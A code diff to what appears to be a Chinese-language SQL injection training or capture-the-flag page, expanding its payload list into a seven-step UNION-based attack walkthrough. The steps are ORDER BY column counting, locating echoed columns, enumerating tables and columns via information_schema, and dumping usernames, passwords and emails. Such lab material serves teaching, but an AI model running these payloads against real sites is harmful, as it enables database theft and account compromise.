@@ -264,23 +264,33 @@ $conn->close();
         </div>
 
         <div class="card">
-            <h3>🎯 联合查询注入Payload</h3>
+            <h3>🎯 联合查询注入完整流程</h3>
             <div class="payload-list">
-                <h4>1. 基本联合查询</h4>
-                <code class="payload" data-payload="1 UNION SELECT 1,2,3,4,5">1 UNION SELECT 1,2,3,4,5</code>
-                <code class="payload" data-payload="0 UNION SELECT 1,2,3,4,5">0 UNION SELECT 1,2,3,4,5</code>
-                
-                <h4>2. 查询用户表</h4>
+                <h4>第一步：判断列数（ORDER BY 逐列试探）</h4>
+                <code class="payload" data-payload="1 ORDER BY 1">1 ORDER BY 1   ← 正常，说明至少1列</code>
+                <code class="payload" data-payload="1 ORDER BY 2">1 ORDER BY 2   ← 正常，说明至少2列</code>
+                <code class="payload" data-payload="1 ORDER BY 3">1 ORDER BY 3   ← 正常，说明至少3列</code>
+                <code class="payload" data-payload="1 ORDER BY 4">1 ORDER BY 4   ← 正常，说明至少4列</code>
+                <code class="payload" data-payload="1 ORDER BY 5">1 ORDER BY 5   ← 正常，说明至少5列</code>
+                <code class="payload" data-payload="1 ORDER BY 6">1 ORDER BY 6   ← 报错！说明只有5列</code>
+
+                <h4>第二步：判断显示位（UNION SELECT 数字标记）</h4>
+                <code class="payload" data-payload="0 UNION SELECT 1,2,3,4,5">0 UNION SELECT 1,2,3,4,5   ← 观察页面上哪些数字回显了</code>
+
+                <h4>第三步：查询数据库基本信息（替换显示位）</h4>
+                <code class="payload" data-payload="0 UNION SELECT 1,version(),database(),user(),5">0 UNION SELECT 1,version(),database(),user(),5</code>
+
+                <h4>第四步：查询所有表名（GROUP_CONCAT 合并到一行）</h4>
+                <code class="payload" data-payload="0 UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5 FROM information_schema.tables WHERE table_schema=database()">0 UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5 FROM information_schema.tables WHERE table_schema=database()   ← 一次显示全部表名</code>
+
+                <h4>第五步：查询目标表的列名（GROUP_CONCAT 合并到一行）</h4>
+                <code class="payload" data-payload="0 UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5 FROM information_schema.columns WHERE table_name='users'">0 UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5 FROM information_schema.columns WHERE table_name='users'   ← 一次显示全部列名</code>
+
+                <h4>第六步：提取敏感数据（查询 users 表）</h4>
                 <code class="payload" data-payload="0 UNION SELECT id,username,password,email,created_at FROM users">0 UNION SELECT id,username,password,email,created_at FROM users</code>
-                
-                <h4>3. 查询产品表</h4>
-                <code class="payload" data-payload="0 UNION SELECT id,name,price,category,now() FROM products">0 UNION SELECT id,name,price,category,now() FROM products</code>
-                
-                <h4>4. 查询flag表</h4>
-                <code class="payload" data-payload="0 UNION SELECT id,flag,description,flag,created_at FROM flags">0 UNION SELECT id,flag,description,flag,created_at FROM flags</code>
-                
-                <h4>5. 查询数据库信息</h4>
-                <code class="payload" data-payload="0 UNION SELECT 1,version(),database(),user(),now()">0 UNION SELECT 1,version(),database(),user(),now()</code>
+
+                <h4>第七步：提取 flag（查询 flags 表）</h4>
+                <code class="payload" data-payload="0 UNION SELECT id,flag,description,1,created_at FROM flags">0 UNION SELECT id,flag,description,1,created_at FROM flags</code>
             </div>
         </div>
 
@@ -294,13 +304,13 @@ $conn->close();
                 4. 提取敏感信息
             </div>
             <div class="sql-code">
--- 联合查询注入示例
-SELECT * FROM users WHERE id=0 UNION SELECT id,username,password,email FROM users;
+-- 联合查询注入示例<br>
+SELECT * FROM users WHERE id=0 UNION SELECT id,username,password,email FROM users;<br>
 
--- 解释：
--- 1. 0 使第一个查询返回空结果
--- 2. UNION 合并第二个查询的结果
--- 3. 第二个查询获取所有用户信息
+-- 解释：<br>
+-- 1. 0 使第一个查询返回空结果<br>
+-- 2. UNION 合并第二个查询的结果<br>
+-- 3. 第二个查询获取所有用户信息<br>
             </div>
         </div>
 
